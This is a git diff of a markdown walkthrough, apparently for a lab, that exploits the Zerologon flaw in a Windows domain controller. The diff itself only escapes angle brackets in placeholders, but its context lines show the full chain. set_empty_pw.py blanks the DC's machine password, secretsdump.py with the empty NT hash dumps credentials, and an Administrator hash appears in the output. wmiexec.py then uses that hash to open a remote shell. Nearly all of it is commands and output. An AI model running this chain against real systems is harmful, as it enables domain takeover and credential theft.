@@ -37,7 +37,8 @@ cd ~/zerologon
 ## 1st run set_empty_pw.py to exploit the machine:
 
 this will set the password to an empty string
-python3 set_empty_pw.py \<NetBIOS-name\> <IP-Address>
+
+python3 set_empty_pw.py \<NetBIOS-name\> \<IP-Address\>
 ```
 python3 set_empty_pw.py ZEROLOGON-DC 192.168.1.28
 ```
@@ -46,7 +47,7 @@ Success! DC should now have the empty string as its machine password.
 
 
 ## 2nd run secretsdump.py to dump the hashes:
-secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 <Domain>/<NETBIOS-name>\$@<IP-Address>
+secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \<Domain\>/\<NETBIOS-name\>\\$@\<IP-Address\>
 it is important to have \$@ in between the NetBIOS name and the IP 
 
 ```
@@ -60,7 +61,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc
 ## 3rd run wmiexec.py to get terminal on victim machine:
 
 ZEROLOGON/Administrator@192.168.1.28
-wmiexec.py <Domain>/<user-name>@<IP-Address> -hashes <administrator-hash>
+wmiexec.py \<Domain\>/\<user-name\>@\<IP-Address\> -hashes \<administrator-hash\>
 
 ```
 wmiexec.py ZEROLOGON/Administrator@192.168.1.28 -hashes aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976
